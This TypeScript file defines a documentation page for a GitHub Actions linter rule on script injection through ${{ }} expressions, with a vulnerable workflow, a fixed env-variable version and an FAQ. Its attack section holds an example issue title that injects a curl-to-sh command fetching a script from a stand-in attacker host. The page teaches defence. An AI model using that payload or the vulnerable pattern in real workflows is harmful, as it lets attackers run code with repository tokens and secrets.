import type { RuleDoc } from './types';

const doc: RuleDoc = {
  id: 'script-injection',
  metaTitle: 'Prevent Script Injection in GitHub Actions',
  metaDescription:
    'How ${{ }} expressions let issue titles, branch names and PR bodies inject shell commands into GitHub Actions, and the env-variable pattern that stops it.',
  h1: 'Prevent script injection in GitHub Actions run steps',
  summary:
    'GitHub evaluates `${{ … }}` expressions before your script runs and pastes the result straight into the script text. If the value comes from an issue title, a pull request body, a branch name or a commit message, whoever wrote that text can make it part of your code. They can then run any command with the job’s token and secrets.',
  sections: [
    {
      heading: 'What this rule checks',
      paragraphs: [
        'The rule looks inside every `run:` script and every `script:` input of `actions/github-script` for expressions that reference attacker-controllable data, and pinpoints each one to its exact line and column. The list of untrusted contexts includes:',
      ],
      list: [
        'issue, pull request and discussion titles and bodies, and comment and review bodies',
        '`github.head_ref` and `github.event.pull_request.head.ref`/`head.label`, since branch names are chosen by the contributor',
        'commit messages and author names or emails (`head_commit`, `commits[*]`)',
        'wiki page names (`pages[*].page_name`) and `workflow_run` head branches and titles',
        '`toJSON(github.event)` and similar, which serialize all of the above at once',
      ],
    },
    {
      heading: 'How the attack works',
      paragraphs: [
        'Suppose a step runs `echo "Title: ${{ github.event.issue.title }}"`. An attacker opens an issue titled `x"; curl -sSfL https://attacker.example/p | sh; echo "`. After substitution, the shell sees three commands, and the middle one downloads and runs the attacker’s script.',
        'Branch names work too. Git allows characters such as `$`, `(`, `;` and backticks in branch names, and `${IFS}` stands in for spaces. Quoting the expression does not help, because the attacker simply closes your quote first.',
        'Severity is **critical** when the workflow uses a trigger that anyone can set off with a privileged token, such as `issues`, `issue_comment`, `pull_request_target`, `discussion` or `workflow_run`. Otherwise it is **high**: the injection still runs attacker code, even if the job holds fewer privileges.',
      ],
    },
    {
      heading: 'How to fix it',
      paragraphs: [
        'Pass the value through an environment variable and reference it as a quoted shell variable. The expression is then evaluated into the environment, not into the script, and the shell treats it purely as data.',
        'In `actions/github-script`, read `process.env.NAME` or use the already-parsed `context.payload` object instead of interpolating text into JavaScript. When calling other actions, pass untrusted values through `with:` inputs, which reach the action as data.',
      ],
    },
  ],
  vulnerable: {
    caption: 'The issue title becomes part of the shell script.',
    code: `on:
  issues:
    types: [opened]

jobs:
  greet:
    runs-on: ubuntu-latest
    steps:
      - run: |
          echo "New issue: \${{ github.event.issue.title }}"`,
  },
  fixed: {
    caption: 'The title is passed as an environment variable and quoted.',
    code: `on:
  issues:
    types: [opened]

jobs:
  greet:
    runs-on: ubuntu-latest
    steps:
      - env:
          ISSUE_TITLE: \${{ github.event.issue.title }}
        run: |
          echo "New issue: $ISSUE_TITLE"`,
  },
  references: [
    { title: 'GitHub Docs: Script injections', url: 'https://docs.github.com/en/actions/concepts/security/script-injections' },
    { title: 'GitHub Security Lab: Untrusted input in GitHub Actions', url: 'https://securitylab.github.com/resources/github-actions-untrusted-input/' },
    { title: 'GitHub Docs: Contexts reference — github context', url: 'https://docs.github.com/en/actions/reference/workflows-and-actions/contexts' },
  ],
  faq: [
    {
      q: 'Is `${{ github.event.issue.number }}` safe?',
      a: 'Yes. Numbers, SHAs and fields that GitHub generates cannot carry shell syntax. This rule only flags free-text fields that a user can choose.',
    },
    {
      q: 'Do I need to quote the environment variable?',
      a: 'Yes. Write `"$ISSUE_TITLE"` in bash so that spaces and globbing characters are not interpreted. In PowerShell, use `$env:ISSUE_TITLE`.',
    },
    {
      q: 'What about step outputs such as `steps.x.outputs.title`?',
      a: 'If an earlier step copied untrusted text into an output, the output is just as dangerous. Treat it the same way and pass it through `env:`.',
    },
  ],
};

export default doc;
